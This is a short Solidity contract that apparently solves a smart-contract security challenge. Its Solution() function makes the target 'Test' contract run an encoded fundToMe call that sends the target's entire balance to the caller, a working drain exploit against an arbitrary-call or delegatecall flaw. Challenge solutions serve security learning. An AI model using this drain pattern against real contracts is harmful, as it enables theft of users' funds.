// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface Test {
    function transferFunds(address _address, bytes calldata _payload) external;
}

contract Task1 {
    address public testContract;

    constructor(address _test) {
        testContract = _test;
    }

    function fundToMe(uint256 _amount, address _recipient) external {
        (bool success, ) = _recipient.call{value: _amount}("");
        require(success, "failed to send tokens to owner");
    }

    function Solution() external {
        uint256 _testBalance = testContract.balance;
        Test(testContract).transferFunds(
            address(this),
            abi.encodeWithSignature(
                "fundToMe(uint256,address)",
                _testBalance,
                msg.sender
            )
        );
    }
}
